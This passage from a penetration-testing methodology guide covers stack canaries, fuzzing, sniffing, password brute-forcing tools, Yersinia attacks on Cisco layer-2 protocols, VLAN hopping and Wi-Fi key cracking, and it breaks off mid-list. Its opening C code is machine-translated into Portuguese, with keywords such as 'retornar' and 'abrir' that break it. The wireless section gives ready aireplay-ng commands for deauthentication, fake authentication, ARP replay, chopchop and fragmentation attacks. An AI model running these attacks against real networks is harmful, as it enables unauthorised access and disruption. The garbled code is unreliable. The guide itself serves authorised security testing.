`  `interno fd; 

`  `if (\_\_stack\_chk\_guard! = 0) 

`    `retornar; 

`  `fd = abrir ("/dev/urandom", O\_RDONLY); 

`  `if (fd! = -1) 

`    `{ 

`      `ssize\_t tamanho = leitura (fd, &\_\_stack\_chk\_guard, 

`                           `sizeof (\_\_stack\_chk\_guard)); 

`      `fechar (fd); 

`      `if (size == sizeof(\_\_stack\_chk\_guard) && \_\_stack\_chk\_guard != 0) 

`        `return; 

`    `} 

`  `/\* Se um gerador aleatório não puder ser usado, o protetor muda a guarda 

`     `para o "terminador canário". \*/ 

`  `p = (caractere não assinado \*) &\_\_stack\_chk\_guard; 

`  `p[sizeof(\_\_stack\_chk\_guard)-1] = 255; 

`  `p[sizeof(\_\_stack\_chk\_guard)-2] = '\n'; 

`  `p[0] = 0; 

}

Sabe-se que algumas versões mais antigas do gcc não utilizam o dispositivo urandom para criar um novo cookie. Eles usam um valor de cookie predefinido (uma mistura de caracteres não imprimíveis, como 00 0A 0D e FF). O Gcc compilará um aplicativo com canários de pilha por padrão. 

Problemas com a implementação no Linux: Em uma máquina Linux, existem algumas maneiras diferentes de criar um thread. Um deles é chamado fork(). Ao usar fork para criar um novo thread, o aplicativo criará "rapidamente" um novo thread que reutilizará o cookie calculado para cada novo thread "fork". Se existisse um estouro de buffer neste encadeamento bifurcado, um invasor poderia aplicar força bruta no canário da pilha. Mais uma vez, um ótimo artigo descrevendo esse ataque pode ser encontrado aqui ( [Recortes de notas sobre exploração remota de estouro de pilha](http://www.phrack.org/issues.html?issue=67&id=13) ) 
###### **MAC OS**
Desativado por padrão. Contribuição necessária. 
### **Exploração Personalizada**
##### **Confuso**
Fuzzing é o processo de tentar descobrir vulnerabilidades de segurança enviando entradas aleatórias para um aplicativo. Se o programa contiver uma vulnerabilidade que possa levar a uma exceção, falha ou erro de servidor (no caso de aplicativos da web), poderá ser determinado que uma vulnerabilidade foi descoberta. Fuzzers geralmente são bons para encontrar bugs de buffer overflow, DoS, SQL Injection, XSS e Format String. A difusão se enquadra em duas categorias: Fuzzing idiota e Fuzzing inteligente. 
##### **Fuzzing idiota**
Dumb Fuzzing usually consists of simple modifications to legitimate data, that is then fed to the target application. In this case, the fuzzer is very easy to write and the idea is to identify low hanging fruit. Although not an elegant approach, dumb fuzzing can produce results, especially when a target application has not been previously tested. FileFuzz is an example of a Dumb Fuzzer. FileFuzz is a Windows based file format fuzzing tool that was designed to automate the launching of applications and detection of exceptions caused by fuzzed file formats. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_131.png "Arquivo:Execução de teste de penetração 131.png")
##### **Intelligent Fuzzing**
Intelligent Fuzzers are ones that are generally aware of the protocol or format of the data being tested. Some protocols require that the fuzzer maintain state information, such as HTTP or SIP. Other protocols will make use of authentication before a vulnerability is identified. Apart from providing much more code coverage, intelligent fuzzers tend to cut down the fuzzing time significantly since they avoid sending data that the target application will not understand. Intelligent fuzzers are therefore much more targeted and sometimes they need to be developed by the security researcher. 
#### **Sniffing**
A packet analyzer is used to intercept and log traffic passing over the network. It is considered best practice to utilize a sniffer when performing exploitation. This ensures that all relevant traffic is captured for further analysis. This is also extremely useful for extracting cleartext passwords. 
##### **Wireshark**
Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. 

Wireshark is cross-platform, using the GTK+ widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_132.png "Arquivo:Execução de teste de penetração 132.png")
##### **Tcpdump**
Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. 

There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_133.png "Arquivo:Execução de teste de penetração 133.png")
#### **Brute-Force**
A brute force attack is a strategy that can in theory be used by an attacker who is unable to take advantage of any weakness in a system. It involves systematically checking all possible usernames and passwords until the correct one is found. 
##### **Brutus (Windows)**
Brutus is a generic password guessing tool that comes with built-in routines for attacking 

HTTP Basic and Forms-based authentication, among other protocols like SMTP and 

POP3. Brutus can perform both *dictionary* and randomly generated attacks from a given character set. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_134.png "Arquivo:Execução de teste de penetração 134.png")
##### **Web Brute (Windows)**
Web Brute is included with HP WebInspect and is the primary means of attacking a login form or authentication page, using prepared lists of user names and passwords. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_135.png "Arquivo:Execução de teste de penetração 135.png")
##### **THC-Hydra/XHydra**
THC-Hydra (or just Hydra) is a network logon bruteforcer which supports attacking many different services such as FTP, HTTP, HTTPS, ICQ, IRC, IMAP, LDAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SAP R/3, SIP, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), TeamSpeak, Telnet, VNC, VMware Auth Daemon, and XMPP. It is available in both a command line and GUI version. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_136.png "Arquivo:Execução de teste de penetração 136.png")

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_137.png "Arquivo:Execução de teste de penetração 137.png")
##### **Medusa**
Medus is another network logon bruteforcer which supports attacking many different services such as AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), Telnet, VNC, and VMware Auth Daemon. It is only available in a command line version. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_138.png "Arquivo:Execução de teste de penetração 138.png")
##### **Ncrack**
Ncrack is another network logon bruteforcer which supports attacking many different services such as RDP, SSH, http(s), SMB, pop3(s), FTP, and telnet. Ncrack was designed using a modular approach, a command-line syntax similar to Nmap and a dynamic engine that can adapt its behavior based on network feedback. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_139.png "Arquivo:Execução de teste de penetração 139.png")
#### **Routing protocols**
Routing protocols specify how routers communicate with each other, disseminating information that enables them to select routes between any two nodes on a computer network, the choice of the route being done by routing algorithms. Each router has a priori knowledge only of networks attached to it directly. A routing protocol shares this information first among immediate neighbors, and then throughout the network. This way, routers gain knowledge of the topology of the network. 
#### **Cisco Discovery Protocol (CDP)**
The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer network protocol developed by Cisco Systems that is implemented in most Cisco networking equipment. It is used to share information about other directly connected Cisco equipment, such as the operating system version and IP address. CDP can also be used for On-Demand Routing, which is a method of including routing information in CDP announcements so that dynamic routing protocols do not need to be used in simple networks. 

Cisco devices send CDP announcements to the multicast destination address 01:00:0C:CC:CC:CC, out each connected network interface. These multicast packets may be received by Cisco switches and other networking devices that support CDP into their connected network interface. This multicast destination is also used in other Cisco protocols such as VTP. By default, CDP announcements are sent every 60 seconds on interfaces that support Subnetwork Access Protocol (SNAP) headers, including Ethernet, Frame Relay, and Asynchronous Transfer Mode (ATM). Each Cisco device that supports CDP stores the information received from other devices in a table that can be viewed using the show cdp neighbors command. This table is also accessible via snmp. The CDP table information is refreshed each time an announcement is received, and the holdtime for that entry is reinitialized. The holdtime specifies the lifetime of an entry in the table - if no announcements are received from a device for a period in excess of the holdtime, the device information is discarded (default 180 seconds). 

The information contained in CDP announcements varies by the type of device and the version of the operating system running on it. This information may include the operating system version, hostname, every address (i.e. IP address) from all protocol(s) configured on the port where CDP frame is sent, the port identifier from which the announcement was sent, device type and model, duplex setting, VTP domain, native VLAN, power draw (for Power over Ethernet devices), and other device specific information. The details contained in these announcements are easily extended due to the use of the type-length-value (TLV) frame format. The tool for attacking CDP is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_140.png "Arquivo:Execução de teste de penetração 140.png")
#### **Hot Standby Router Protocol (HSRP)**
Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy protocol for establishing a fault-tolerant default gateway, and has been described in detail in RFC 2281. The Virtual Router Redundancy Protocol (VRRP) is a standards-based alternative to HSRP defined in IETF standard RFC 3768. The two technologies are similar in concept, but not compatible. 

The protocol establishes a framework between network routers in order to achieve default gateway failover if the primary gateway should become inaccessible, in close association with a rapid-converging routing protocol like EIGRP or OSPF. By multicasting packets, HSRP sends its hello messages to the multicast address 224.0.0.2 (all routers) using UDP port 1985, to other HSRP-enabled routers, defining priority between the routers. The primary router with the highest configured priority will act as a virtual router with a pre-defined gateway IP address and will respond to the ARP request from machines connected to the LAN with the MAC address 0000.0c07.acXX where XX is the group ID in hex. If the primary router should fail, the router with the next-highest priority would take over the gateway IP address and answer ARP requests with the same mac address, thus achieving transparent default gateway fail-over. A HSRP Basics Simulation visualizes Active/Standby election and link failover with Hello, Coup, ARP Reply packets, and timers. 

HSRP and VRRP are not routing protocols as they do not advertise IP routes or affect the routing table in any way. 

HSRP and VRRP on some routers have the ability to trigger a failover if one or more interfaces on the router go down. This can be useful for dual branch routers each with a single serial link back to the head end. If the serial link of the primary router goes down, you would want the backup router to take over the primary functionality and thus retain connectivity to the head end. The tool for attacking HSRP is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_141.png "Arquivo:Execução de teste de penetração 141.png")
#### **Virtual Switch Redundancy Protocol (VSRP)**
The Virtual Switch Redundancy Protocol (VSRP) is a proprietary network resilience protocol developed by Foundry Networks and currently being sold in products manufactured by both Foundry and Hewlett Packard. The protocol differs from many others in use as it combines Layer 2 and Layer 3 resilience - effectively doing the jobs of both Spanning tree protocol and the Virtual Router Redundancy Protocol at the same time. Whilst the restrictions on the physical topologies able to make use of VSRP mean that it is less flexible than STP and VRRP it does significantly improve on the failover times provided by either of those protocols. 
#### **Dynamic Trunking Protocol (DTP)**
The Dynamic Trunking Protocol (DTP) is a proprietary networking protocol developed by Cisco Systems for the purpose of negotiating trunking on a link between two VLAN-aware switches, and for negotiating the type of trunking encapsulation to be used. It works on the Layer 2 of the OSI model. VLAN trunks formed using DTP may utilize either IEEE 802.1Q or Cisco ISL trunking protocols. 

DTP should not be confused with VTP, as they serve different purposes. VTP communicates VLAN existence information between switches. DTP aids with trunk port establishment. Neither protocol transmits the data frames that trunks carry. The tool for attacking DTP is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_142.png "Arquivo:Execução de teste de penetração 142.png")
#### **Spanning Tree Protocol (STP)**
The Spanning Tree Protocol (STP) is a network protocol that ensures a loop-free topology for any bridged Ethernet local area network. The basic function of STP is to prevent bridge loops and ensuing broadcast radiation. Spanning tree also allows a network design to include spare (redundant) links to provide automatic backup paths if an active link fails, without the danger of bridge loops, or the need for manual enabling/disabling of these backup links. 

STP is a Data Link Layer protocol. It is standardized as IEEE 802.1D. As the name suggests, it creates a spanning tree within a mesh network of connected layer-2 bridges (typically Ethernet switches), and disables those links that are not part of the spanning tree, leaving a single active path between any two network nodes. The tool for attacking STP is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_143.png "Arquivo:Execução de teste de penetração 143.png")
#### **Open Shortest Path First (OSPF)**
Open Shortest Path First (OSPF) is an adaptive routing protocol for Internet Protocol (IP) networks. It uses a link state routing algorithm and falls into the group of interior routing protocols, operating within a single autonomous system (AS). It is defined as OSPF Version 2 in RFC 2328 (1998) for IPv4. The updates for IPv6 are specified as OSPF Version 3 in RFC 5340 (2008). 
#### **RIP**
RIP is a dynamic routing protocol used in local and wide area networks. As such it is classified as an interior gateway protocol (IGP). It uses the distance-vector routing algorithm. It was first defined in RFC 1058 (1988). The protocol has since been extended several times, resulting in RIP Version 2 (RFC 2453). Both versions are still in use today, although they are considered to have been made technically obsolete by more advanced techniques such as Open Shortest Path First (OSPF) and the OSI protocol IS-IS. RIP has also been adapted for use in IPv6 networks, a standard known as RIPng (RIP next generation) protocol, published in RFC 2080 (1997). 
#### **VLAN Hopping**
VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked resources on a VLAN. The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible. There are two primary methods of VLAN hopping: switch spoofing and double tagging. 

In a switch spoofing attack, an attacking host that is capable of speaking the tagging and trunking protocols used in maintaining a VLAN imitates a trunking switch. Traffic for multiple VLANs is then accessible to the attacking host. 

In a double tagging attack, an attacking host prepends two VLAN tags to packets that it transmits. The first header (which corresponds to the VLAN that the attacker is really a member of) is stripped off by a first switch the packet encounters, and the packet is then forwarded. The second, false, header is then visible to the second switch that the packet encounters. This false VLAN header indicates that the packet is destined for a host on a second, target VLAN. The packet is then sent to the target host as though it were layer 2 traffic. By this method, the attacking host can bypass layer 3 security measures that are used to logically isolate hosts from one another. The tool for attacking 802.1q is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_144.png "Arquivo:Execução de teste de penetração 144.png")
#### **VLAN Trunking Protocol (VTP)**
VLAN Trunking Protocol (VTP) is a Cisco proprietary Layer 2 messaging protocol that manages the addition, deletion, and renaming of Virtual Local Area Networks (VLAN) on a network-wide basis. Cisco's VLAN Trunk Protocol reduces administration in a switched network. When a new VLAN is configured on one VTP server, the VLAN is distributed through all switches in the domain. This reduces the need to configure the same VLAN everywhere. To do this, VTP carries VLAN information to all the switches in a VTP domain. VTP advertisements can be sent over ISL, 802.1q, IEEE 802.10 and LANE trunks. VTP is available on most of the Cisco Catalyst Family products. The tool for attacking VTP is Yersinia. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_145.png "Arquivo:Execução de teste de penetração 145.png")
### **RF Access**
The goal of the earlier phases is to gather every possible piece of information about the Radio Frequencies in use that can be leveraged during this phase. 
#### **Unencrypted Wireless LAN**
It is possible to actually connect to an unencrypted Wireless LAN (WLAN). To connect to an unencrypted WLAN, you simply have to either issue appropriate commands or use a GUI interface to connect. 
##### **Iwconfig (Linux)**
The following commands to connect up to the ESSID. To ensure that the wireless interface is down, issue the following: 

ifconfig <interface> down

Force dhclient to release any currently assigned DHCP addresses with the following command:

dhclient -r <interface>

Bring the interface back up with the following command:

ifconfig <interface> up

Iwconfig is similar to ifconfig, but is dedicated to the wireless interfaces. It is used to set the parameters of the network interface which are specific to the wireless operation. To assign set the ESSID (or Network Name to the wireless interface, use the following command: 

iwconfig <interface> essid "ESSID\_IN\_QUOTES"

Next we need to set the operating mode of the device, which depends on the network topology. Setting this to *Managed* means that we are connecting to a network that is composed of access points. 

iwconfig <interface> mode Managed

Use dhclient to obtain a DHCP addresses with the following command: 

dhclient <interface>

At this point we should receive an IP address and be connected to the client's wireless network. Ensure that adequate screen shots are taken to definitively indicate the ability to connect, receive an IP address, and traverse the network. 
##### **Windows (XP/7)**
Based upon the wireless network adapter installed, Windows will provide you with a mechanism to connect to wireless networks. The version of Windows utilized will dictate the process. For this reason we are covering Windows XP and 7. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_146.png "Arquivo:Execução de teste de penetração 146.png")

Windows XP will show an icon with a notification that says it has found wireless networks. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_147.png "Arquivo:Execução de teste de penetração 147.png")

Right-click the wireless network icon in the lower right corner of your screen, and then click "View Available Wireless Networks." 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_148.png "Arquivo:Execução de teste de penetração 148.png")

The Wireless Network Connection window appears and displays your wireless network listed with the SSID you chose. If you don't see your network, click Refresh network list in the upper left corner. Click your network, and then click Connect in the lower right corner. 

Windows 7 offers the same ability to connect to wireless networks. On the right side of the taskbar, you will see a wireless network icon like the one below. Click on it. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_149.png "Arquivo:Execução de teste de penetração 149.png")

A window with available network connections will open. As you can see from the screenshot below, the list is split by the type of available network connections. At the top you have [dial-up](http://en.wikipedia.org/wiki/Dial-up) and [virtual private network (VPN)](http://en.wikipedia.org/wiki/VPN) connections, while at the bottom you have a list of all the wireless networks which Windows 7 has detected. To refresh the list of available networks, click on the button highlighted in the screenshot below. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_150.png "Arquivo:Execução de teste de penetração 150.png")

You can scroll down through the list of available networks. Once you decided on which network to connect to, click on it. Next, click on the *Connect* button. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_151.png "Arquivo:Execução de teste de penetração 151.png")

If everything is OK, Windows 7 will connect to the network you selected using the given security key. 
#### **Attacking the Access Point**
All identified access points are vulnerable to numerous attacks. For completeness, we've included some attack methods that may not be a part of all engagements. Ensure that the scoping is reviewed prior to initiating any attacks. 
##### **Denial of Service (DoS)**
Within the standard, there are two packets that help in this regard, the *Clear To Send (CTS)* and *Request To Send (RTS)* packets. Devices use RTS packets when they have something big to send, and they don't want other devices to step on their transmission. CTS packets are sent so that the device knows it's okay to transmit. Every device (other than the one that sent the RTS) within the range of the CTS packet cannot transmit anything for the duration specified. 

The first technique is to transmit the CTS packets, meaning that anyone in range of your signal will be unable to transmit. This requires a high-gain Omni-directional antenna to a much greater impact. The second technique is to send an RTS packet to the AP you are targeting. Once the AP gets the RTS packet, it will send the CTS. A highly directional antenna from a distance can be used to target the AP with an RTS packet. Generally speaking, transmitting the CTS has a greater impact. 
#### **Cracking Passwords**
##### **WPA-PSK/ WPA2-PSK**
WPA-PSK is vulnerable to brute force attack. Tools like Aircrack and coWPAtty take advantage of this weakness and provided a way to test keys against dictionaries. The problem is that it's a very slow process. Precomputational attacks are limited as the BSSID and the BSSID length are seeded into the passphrase hash. This is why WPA-PSK attacks are generally limited due by time. There is no difference between cracking WPA or WPA2, the authentication is essentially the same. 

The main requirement for any WPA/WPA2 is to capture the authentication handshake and then use Aircrack-ng to crack the pre-shared key. This can be done either actively or passively. "Actively" means you will accelerate the process by deauthenticating an existing wireless client. "Passively" means you simply wait for a wireless client to authenticate to the WPA/WPA2 network. 
##### **WPA/WPA2-Enterprise**
In environments with a large number of users, such as corporations or universities, WPA/WPA2 pre-shared key management is not feasible. For example, it wouldn't be possible to track which users are connected and it would be impossible to revoke access to the network for individuals without changing the key for everyone. Therefore WPA2 Enterprise authenticates users against a user database (RADIUS). Two common methods to do that are WPA2-EAP-TTLS and WPA2-PEAP. 
#### **Attacks**
##### **LEAP**
This stands for the Lightweight Extensible Authentication Protocol. This protocol is based on 802.1X and helps minimize the original security flaws by using WEP and a sophisticated key management system. This EAP-version is safer than EAP-MD5. This also uses MAC address authentication. LEAP is not safe against crackers. THC-LeapCracker can be used to break Cisco's version of LEAP and be used against computers connected to an access point in the form of a dictionary attack. Anwrap and asleap are other crackers capable of breaking LEAP. 
###### **Asleap**
Asleap is a designed specifically to recover weak LEAP (Cisco's Lightweight Extensible Authentication Protocol) and PPTP passwords. Asleap performs Weak LEAP and PPTP password recovery from pcap and AiroPeek files or from live capture. Finally, it has the ability to deauthenticate clients on a leap WLAN (speeding up leap password recovery). 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_152.png "Arquivo:Execução de teste de penetração 152.png")

The first step involved in the use of asleap is to produce the necessary database (.dat) and index files (.idx) using genkeys from the supplied (-r) a dictionary (wordlist) file. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_153.png "Arquivo:Execução de teste de penetração 153.png")

The final step in recovering the weak LEAP password is to run the asleap command with our newly created .dat and .idx files: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_154.png "Arquivo:Execução de teste de penetração 154.png")
##### **802.1X**
802\.1X is an IEEE Standard for port-based Network Access Control (PNAC). It is part of the IEEE 802.1 group of networking protocols. It provides an authentication mechanism to devices wishing to attach to a LAN or WLAN. 

IEEE 802.1X defines the encapsulation of the Extensible Authentication Protocol (EAP) over IEEE 802 which is known as "EAP over LAN" or EAPOL. There are two main attacks which can be used against 802.1X:
###### **Key Distribution Attack**
The key distribution attack exploits a weakness in the RADIUS protocol. The key distribution attack relies on an attacker capturing the PMK transmission between the RADIUS server and the AP. As the PMK is transmitted outside of the TLS tunnel, its protection is solely reliant on the RADIUS server's HMAC-MD5 hashing algorithm. Should an attacker be able to leverage a man-in-the-middle attack between the AP and RADIUS sever, a brute-force attempt could be made to crack the RADIUS shared secret. This would ultimately provide the attacker with access to the PMK - allowing full decryption of all traffic between the AP and supplicant. 
###### **RADIUS Impersonation Attack**
The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline. 
##### **PEAP**
The Protected Extensible Authentication Protocol (Protected EAP or PEAP) is a protocol that encapsulates the Extensible Authentication Protocol (EAP) within an encrypted and authenticated Transport Layer Security (TLS) tunnel. The purpose was to correct deficiencies in EAP; EAP assumed a protected communication channel, such as that provided by physical security, so facilities for protection of the EAP conversation were not provided. 
###### **RADIUS Impersonation Attack**
The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline. 
###### **Authentication Attack**
The PEAP authentication attack is a primitive means of gaining unauthorized access to PEAP networks. By sniffing usernames from the initial (unprotected) PEAP identity exchange an attacker can attempt to authenticate to the target network by 'guessing' user passwords. This attack is often ineffective as the authenticator will silently ignores bad login attempts ensuring a several second delay exists between login attempts. 
##### **EAP-Fast**
EAP-FAST (Flexible Authentication via Secure Tunneling) is Cisco's replacement for LEAP. The protocol was designed to address the weaknesses of LEAP while preserving the "lightweight" implementation. EAP-FAST uses a Protected Access Credential (PAC) to establish a TLS tunnel in which client credentials are verified. EAP-FAST provides better protection against dictionary attacks, but is vulnerable to MITM attacks. Since many implementations of EAP-FAST leave anonymous provisioning enabled, AP impersonation can reveal weak credential exchanges. 
##### **WEP/WPA/WPA2**
The core process of connecting to a WEP encrypted network revolves around obtaining the WEP key for the purpose of connecting to the network. There are several tools that can be used to perform attacks against WEP. 
##### **Aircrack-ng**
Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured. It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the all-new PTW attack, thus making the attack much faster compared to other WEP cracking tools. 

The first step is to place the wireless interface in monitor mode by entering: 

airmon-ng start wlan0

**Airmon-ng**

Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status. 

To start wlan0 in monitor mode: 

airmon-ng start wlan0

To start wlan0 in monitor mode on channel 8: 

airmon-ng start wlan0 8

To stop wlan0: 

airmon-ng stop wlan0

To check the status: 

airmon-ng

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_155.png "Arquivo:Execução de teste de penetração 155.png")

Enter "iwconfig" to validate the wireless interfaces. The output should look similar to: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_156.png "Arquivo:Execução de teste de penetração 156.png")

**Airodump-ng**

Airodump-ng is used for packet capturing of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vector) for the intent of using them with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found access points. 

Usage: 

airodump-ng <options> <interface>[,<interface>,...]

Options:

--ivs               : Save only captured IVs

--gpsd              : Use GPSd

--write    <prefix> : Dump file prefix

-w                  : same as --write

--beacons           : Record all beacons in dump file

--update     <secs> : Display update delay in seconds

--showack           : Prints ack/cts/rts statistics

-h                  : Hides known stations for --showack

-f          <msecs> : Time in ms between hopping channels

--berlin     <secs> : Time before removing the AP/client

from the screen when no more packets

are received (Default: 120 seconds)

-r           <file> : Read packets from that file

-x          <msecs> : Active Scanning Simulation

--output-format

<formats> : Output format. Possible values:

pcap, ivs, csv, gps, kismet, netxml

Short format "-o"

The option can be specified multiple   times.  In this case, each file format specified will be output.  Only ivs or pcap can be used, not both.

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_157.png "Arquivo:Execução de teste de penetração 157.png")

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_158.png "Arquivo:Execução de teste de penetração 158.png")

**Aireplay-ng**

Aireplay-ng is primarily used to generate or accelerate traffic for the later use with Aircrack-ng (for cracking WEP keys). Aireplay-ng supports various attacks such as deauthentication, fake authentication, Interactive packet replay, hand-crafted ARP request injection and ARP-request re injection. Usage: 

aireplay-ng <options> <replay interface>

These are the attack names and their corresponding "numbers": 

- **Attack 0:** Deauthentication
- **Attack 1:** Fake authentication
- **Attack 2:** Interactive packet replay
- **Attack 3:** ARP request replay attack
- **Attack 4:** KoreK chopchop attack
- **Attack 5:** Fragmentation attack
- **Attack 9:** Injection test

Note: Not all options apply to all attacks. 

**Attack 0 - Deauthentication**

A deauthentication attack sends disassociation packets to one or more clients who are currently associated with an AP. Disassociating clients can reveal a hidden / cloaked ESSID. Deauthentication attacks also provide an ability to capture WPA/WPA2 handshakes by forcing clients to re-authenticate. 

aireplay-ng -0 1 -a 34:EF:44:BB:14:C1 -c 00:E0:4C:6D:27:8D wlan0

- -0 means deauthentication
- 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
- -a 34:EF:44:BB:14:C1 is the MAC address of the access point
- -c 00:E0:4C:6D:27:8D is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
- wlan0 is the interface name

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_159.png "Arquivo:Execução de teste de penetração 159.png")

**Attack 1 - Fake authentication**

The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) and to associate with an AP. This attack is useful in scenarios where there are no associated clients. Note that fake authentication attacks do not generate ARP packets. 

aireplay-ng -1 0 -e 2WIRE696 -a 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0

- -1 means fake authentication
- 0 reassociation timing in seconds
- -e 2WIRE696 is the wireless network name
- -a 34:EF:44:BB:14:C1 is the access point MAC address
- -h 00:E0:4C:6D:27:8D is our card MAC address
- wlan0 is the wireless interface name

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_160.png "Arquivo:Execução de teste de penetração 160.png")

**Attack 3 - ARP Request Replay Attack**

The classic ARP request replay attack is the most effective way to generate new initialization vectors. This attack is probably the most reliable of all. The program listens for an ARP packet then retransmits it back to the AP. This, in turn causes the AP to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the AP has a new IV. The collection of these IVs will later help us later in determining the WEP key. 

aireplay-ng -3 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0

- -3 means standard arp request replay
- -b 34:EF:44:BB:14:C1 is the access point MAC address
- -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)
- wlan0 is the wireless interface name

**Attack 4 - KoreK chopchop**

The KoreK chopchop attack can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP. *This attack does not recover the WEP key itself, it merely reveals the plaintext*. Some APs are not vulnerable to this attack. They may seem vulnerable at first but actually drop data packets shorter than 60 bytes. If the AP drops packets shorter than 42 bytes, Aireplay tries to guess the rest of the missing data, as far as the headers are predictable. If an IP packet is captured Aireplay checks if the checksum of the header is correct after guessing its missing parts. Remember that this attack requires at least one WEP data packet. 

aireplay-ng -4 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0

- -4 means the chopchop attack
- -b 34:EF:44:BB:14:C1 is the access point MAC address
- -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)
- wlan0 is the wireless interface name

**Attack 5 - Fragmentation Attack**

The fragmentation attack does not recover the WEP key itself, but (also) obtains the PRGA (pseudo random generation algorithm) of the packet. The PRGA can then be used to generate packets with Packetforge-ng which are in turn are used for various injection attacks. The attack requires at least one data packet to be received from the AP in order to initiate the attack. Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the AP. If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained (sometimes less than 1500 bytes). 

aireplay-ng -5 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0

- -5 means run the fragmentation attack
- -b 34:EF:44:BB:14:C1 is the access point MAC address
- -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)
- wlan0 is the wireless interface name

**Attack 9: Injection test**

